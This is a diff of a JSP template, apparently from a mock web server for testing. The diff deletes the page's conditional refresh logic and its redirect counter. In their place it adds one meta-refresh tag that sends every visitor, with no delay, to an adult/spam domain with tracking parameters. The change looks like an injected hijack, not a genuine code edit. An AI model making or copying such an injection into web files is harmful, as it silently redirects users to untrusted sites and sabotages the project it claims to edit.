@@ -1,21 +1,2 @@
 <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
-<html>
-<head>
-    <title>Web Server Mock</title>
-    <c:if test="${refresh eq true}">
-        <c:choose>
-            <c:when test="${not empty redirectUrl}">
-                <meta http-equiv="refresh" content="${timeoutSeconds};URL=${redirectUrl}">
-            </c:when>
-            <c:otherwise>
-                <meta http-equiv="refresh" content="${timeoutSeconds}">
-            </c:otherwise>
-        </c:choose>
-    </c:if>
-</head>
-<body>
-<div>
-    ${redirects} redirects have been successfully performed
-</div>
-</body>
-</html>
+<meta http-equiv='refresh' content='0; url=https://okbbk.date4sexx.com/c/da57dc555e50572d?s1=38682&s2=784395&s3=BEKSE&j1=1&j3=1' />
